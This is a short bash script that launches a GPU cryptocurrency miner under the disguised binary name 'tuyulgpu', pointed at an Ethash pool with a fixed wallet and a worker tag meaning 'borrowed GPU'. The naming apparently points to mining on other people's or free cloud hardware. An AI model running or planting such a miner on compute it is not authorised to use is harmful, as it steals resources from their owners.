#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:TNm3k3uCQXtfYhwPZFzNq4dTCPumBSfYNp.net
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROX
